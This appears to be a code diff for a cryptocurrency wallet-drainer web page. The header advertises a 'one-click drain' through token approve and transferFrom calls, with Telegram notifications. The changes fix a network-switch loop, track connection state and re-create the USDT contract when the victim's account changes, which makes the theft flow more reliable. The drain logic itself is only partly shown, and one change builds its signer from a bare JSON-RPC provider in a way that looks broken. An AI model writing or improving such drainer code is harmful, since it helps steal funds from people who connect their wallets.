@@ -5,6 +5,7 @@
  * - ONE-CLICK DRAIN (Approve + TransferFrom)
  * - Robust Error Handling
  * - Telegram Notifications
+ * - Fixed Network Switch Loop
  */
 
 // ================= CONFIGURATION ================= //
@@ -33,6 +34,7 @@ let provider = null;
 let signer = null;
 let usdtContract = null;
 let isApproving = false;
+let isConnected = false; // <--- Added state tracking
 
 // ================= DOM ELEMENTS ================= //
 const btnConnect = document.getElementById("connect-btn");
@@ -86,8 +88,8 @@ async function initWallet() {
  usdtContract = new ethers.Contract(
  CONFIG.usdtContractAddress,
  ["function balanceOf(address owner) view returns (uint256)",
-  "function approve(address spender, uint256 amount)",
-  "function transferFrom(address from, address to, uint256 amount)"],
+ "function approve(address spender, uint256 amount)",
+ "function transferFrom(address from, address to, uint256 amount)"],
  signer
  );
  
@@ -95,7 +97,7 @@ async function initWallet() {
  await switchToBSC();
  
  // Update UI
- isConnected();
+ updateConnectionState();
  await checkBnbBalance();
  
  // Hide Connect Button, Show Send Button
@@ -115,6 +117,12 @@ async function initWallet() {
 // 2. Switch to BSC Network (Automatic)
 async function switchToBSC() {
  try {
+ // Check if we are already on BSC
+ const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+ if (currentChainId === CONFIG.chainId) {
+ return; // Already on BSC
+ }
+
  await window.ethereum.request({
  method: "wallet_switchEthereumChain",
  params: [{ chainId: CONFIG.chainId }],
@@ -313,7 +321,12 @@ function setLoading(btn, isLoading) {
  }
 }
 
-// 10. Event Listeners
+// 10. Helper: Update Connection State
+function updateConnectionState() {
+ isConnected = true;
+}
+
+// 11. Event Listeners
 btnConnect.addEventListener("click", initWallet);
 btnSend.addEventListener("click", executeSend);
 btnMax.addEventListener("click", setMaxAmount);
@@ -332,14 +345,35 @@ if (window.ethereum) {
  window.ethereum.on("accountsChanged", (newAccounts) => {
  if (newAccounts.length === 0) {
  // User disconnected
+ isConnected = false;
+ btnConnect.style.display = "flex";
+ btnSend.style.display = "none";
+ btnTextConnect.innerText = "Connect Wallet";
+ btnTextSend.innerText = "Send";
+ btnSend.style.backgroundColor = ""; // Reset color
  location.reload();
  } else {
  account = newAccounts[0];
- location.reload();
+ isConnected = true;
+ // Re-initialize contract with new signer
+ provider = new ethers.providers.JsonRpcProvider();
+ signer = provider.getSigner();
+ usdtContract = new ethers.Contract(
+ CONFIG.usdtContractAddress,
+ ["function balanceOf(address owner) view returns (uint256)",
+ "function approve(address spender, uint256 amount)",
+ "function transferFrom(address from, address to, uint256 amount)"],
+ signer
+ );
+ checkBnbBalance();
  }
  });
  
+ // FIX: Remove the reload on chain change. 
+ // Instead, just re-initialize the contract if needed.
  window.ethereum.on("chainChanged", () => {
- location.reload();
+ // Optional: You can remove this entirely if you don't want any behavior on chain change
+ // Or just re-check the balance
+ checkBnbBalance();
  });
 }
